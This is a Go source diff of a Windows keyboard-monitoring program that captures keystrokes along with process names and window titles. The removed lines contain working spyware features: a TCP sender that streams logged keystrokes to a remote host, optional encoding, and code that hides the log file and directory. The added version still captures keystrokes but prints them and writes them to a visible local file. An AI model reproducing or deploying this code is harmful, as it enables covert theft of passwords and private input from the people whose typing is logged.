@@ -2,28 +2,19 @@ package main
 
 import (
 	"fmt"
-	"github.com/guidoxie/keyboard/listener/win32"
-	"io/ioutil"
+	"github.com/BalconyJH/Keyboard-monitor/listener/win32"
 	"log"
-	"net"
 	"os"
 	"strings"
-	"syscall"
 	"time"
 )
 
-var sendChan = make(chan string, 100)
-var sendStatus = make(chan bool)
-
-func keyDump(path string, host string, isEncode bool, isHidden bool) {
+func keyDump(path string) {
 	func() {
 		var key string
-		file, err := openFile(path, isHidden)
+		file, err := openFile(path)
 		if err != nil {
 			panic(err)
-		}
-		if host != "" {
-			go sendRemote(host)
 		}
 		defer func() {
 			file.Close()
@@ -36,34 +27,10 @@ func keyDump(path string, host string, isEncode bool, isHidden bool) {
 				vkCode := event.VkCode
 				if keyMap[vkCode] == "Enter" || keyMap[vkCode] == "Tab" {
 					if len(key) > 0 {
-						fmtStr := fmtEventToString(key, event.ProcessId, event.ProcessName, event.WindowText, event.Time, isEncode)
-						if host != "" {
-							send := fmtStr
-							file.Seek(0, 0) // 文件指针移到开头
-							local, err := ioutil.ReadAll(file)
-							if err != nil {
-								log.Println(err)
-							}
-							if len(local) > 0 {
-								send = string(local) + fmtStr
-							}
-							sendChan <- send
-							ok := <-sendStatus
-							if !ok {
-								// write file
-								if err := writeToFile(file, fmtStr); err != nil {
-									log.Println(err)
-								}
-							} else { // 清空文件内容
-								if err := os.Truncate(path, 0); err != nil {
-									log.Println(err)
-								}
-							}
-						} else {
-							// write file
-							if err := writeToFile(file, fmtStr); err != nil {
-								log.Println(err)
-							}
+						fmtStr := fmtEventToString(key, event.ProcessId, event.ProcessName, event.WindowText, event.Time)
+						fmt.Println(fmtStr)
+						if err := writeToFile(file, fmtStr); err != nil {
+							log.Println(err)
 						}
 						key = ""
 					}
@@ -82,35 +49,10 @@ func keyDump(path string, host string, isEncode bool, isHidden bool) {
 				}
 			case event := <-msEventChanel:
 				if len(key) > 0 {
-					fmtStr := fmtEventToString(key, event.ProcessId, event.ProcessName, event.WindowText, event.Time, isEncode)
-					if host != "" {
-
-						send := fmtStr
-						file.Seek(0, 0) // 文件指针移到开头
-						local, err := ioutil.ReadAll(file)
-						if err != nil {
-							log.Println(err)
-						}
-						if len(local) > 0 {
-							send = string(local) + fmtStr
-						}
-						sendChan <- send
-						ok := <-sendStatus
-						if !ok {
-							// write file
-							if err := writeToFile(file, fmtStr); err != nil {
-								log.Println(err)
-							}
-						} else { // 清空文件内容
-							if err := os.Truncate(path, 0); err != nil {
-								log.Println(err)
-							}
-						}
-					} else {
-						// write file
-						if err := writeToFile(file, fmtStr); err != nil {
-							log.Println(err)
-						}
+					fmtStr := fmtEventToString(key, event.ProcessId, event.ProcessName, event.WindowText, event.Time)
+					fmt.Println(fmtStr)
+					if err := writeToFile(file, fmtStr); err != nil {
+						log.Println(err)
 					}
 					key = ""
 				}
@@ -124,52 +66,11 @@ func isExKey(vkCode win32.DWORD) bool {
 	return ok
 }
 
-func fmtEventToString(keyStr string, processId uint32, processName string, windowText string, t time.Time, isEncode bool) string {
+func fmtEventToString(keyStr string, processId uint32, processName string, windowText string, t time.Time) string {
 	content := fmt.Sprintf("[%s:%d %s %s]\r\n%s\r\n", processName, processId,
 		windowText, t.Format("15:04:05 2006/01/02"), keyStr)
-	if isEncode {
-		content = encode(content)
-	}
 	// 数据包协议 \t\r\n 结束
 	return fmt.Sprintf("%s\t\r\n", content)
-}
-
-func sendRemote(host string) {
-
-	func() {
-		conn, err := net.Dial("tcp", host)
-		if err != nil {
-			log.Println(err)
-		}
-
-		defer func() {
-			if conn != nil {
-				conn.Close()
-			}
-			err := recover()
-			log.Println(err)
-		}()
-		for {
-			select {
-			case str := <-sendChan:
-				if conn == nil {
-					conn, err = net.Dial("tcp", host)
-					if err != nil || conn == nil {
-						sendStatus <- false
-						continue
-					}
-				}
-				if _, err := conn.Write([]byte(str)); err != nil {
-					log.Println(err)
-					conn.Close()
-					conn = nil
-					sendStatus <- false
-					continue
-				}
-				sendStatus <- true
-			}
-		}
-	}()
 }
 
 func writeToFile(file *os.File, str string) error {
@@ -185,7 +86,7 @@ func writeToFile(file *os.File, str string) error {
 	return nil
 }
 
-func openFile(path string, isHidden bool) (*os.File, error) {
+func openFile(path string) (*os.File, error) {
 	p := strings.Split(path, string(os.PathSeparator))
 	if len(p) > 2 {
 		// 创建目录
@@ -193,12 +94,6 @@ func openFile(path string, isHidden bool) (*os.File, error) {
 		err := os.MkdirAll(dir, os.ModePerm)
 		if err != nil {
 			return nil, err
-		}
-		// 隐藏目录
-		if isHidden {
-			if err := hiddenFile(dir); err != nil {
-				return nil, err
-			}
 		}
 	}
 	file, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_RDWR|os.O_SYNC, 0644)
@@ -214,22 +109,7 @@ func openFile(path string, isHidden bool) (*os.File, error) {
 	//	}
 	//	f.Close()
 	//}
-
-	// 隐藏文件
-	if isHidden {
-		if err := hiddenFile(path); err != nil {
-			return nil, err
-		}
-	}
 	return file, nil
-}
-
-func hiddenFile(path string) error {
-	n, err := syscall.UTF16PtrFromString(path)
-	if err != nil {
-		return err
-	}
-	return syscall.SetFileAttributes(n, syscall.FILE_ATTRIBUTE_HIDDEN)
 }
 
 func pathExists(path string) (bool, error) {
